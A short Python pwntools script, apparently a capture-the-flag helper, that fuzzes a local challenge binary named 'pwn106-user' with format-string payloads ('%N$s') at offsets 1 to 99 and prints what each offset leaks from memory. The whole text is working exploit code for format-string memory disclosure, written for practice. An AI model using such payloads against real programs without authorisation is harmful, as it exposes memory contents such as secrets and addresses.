from pwn import *
import os

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./pwn106user.pwn106-user', checksec=False)

# Let's fuzz 100 values
for i in range(1,100):
    try:
        p = process(level='error')
        p.sendlineafter(b': ', '%{}$s'.format(i).encode())
        result = p.recv().split(b' ')
        result = result[1].split(b',')
        leak_char = result[0].ljust(8,b"\x00")
        print(str(i) + ': ' + str(leak_char).strip())
        p.close()
    except EOFError:
        pass